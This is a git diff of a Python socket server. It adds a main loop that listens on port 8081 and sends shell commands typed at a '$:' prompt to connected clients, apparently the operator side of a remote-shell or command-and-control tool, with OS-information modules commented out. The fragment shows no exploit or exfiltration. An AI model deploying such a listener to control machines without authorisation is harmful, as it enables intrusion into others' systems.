@@ -10,8 +10,8 @@ import time
 
 
 #import imports
-import Modules.Linux.linux_info
-import Modules.Windows.windows_info
+#import Modules.Linux.linux_info
+#import Modules.Windows.windows_info
 
 
 HEADER = 64
@@ -31,8 +31,8 @@ class s_sock:
         
         ## threading for clients
         while True:
-            self.start_server.conn, addr = self.server.accept()
-            thread = threading.Thread(target=self.handle_client, args=(self, self.start_server.conn, self.ADDR))
+            self.conn, addr = self.server.accept()
+            thread = threading.Thread(target=self.handle_client, args=(self.conn, self.ADDR))
             thread.start()
             return True
         
@@ -70,8 +70,8 @@ class s_sock:
     
     def send_msg(self, message):
         
-        self.start_server.conn.send(message.encode())
-        recieve_msg = self.start_server.conn.recv(1024).decode() ## was 10000
+        self.conn.send(message.encode())
+        recieve_msg = self.conn.recv(1024).decode() ## was 10000
         
         if recieve_msg == None:
             self.conected = False
@@ -152,4 +152,8 @@ class s_action:
 
 if __name__ == "__main__":
     ## could listen on multiple ports with threading this whole thing
-    s_sock.start_server(s_sock,'0.0.0.0',5064)
+    SERV = s_sock()
+    SERV.start_server('0.0.0.0',8081)
+    while True:
+        shellcommand = input("$: ")
+        SERV.send_msg(shellcommand)
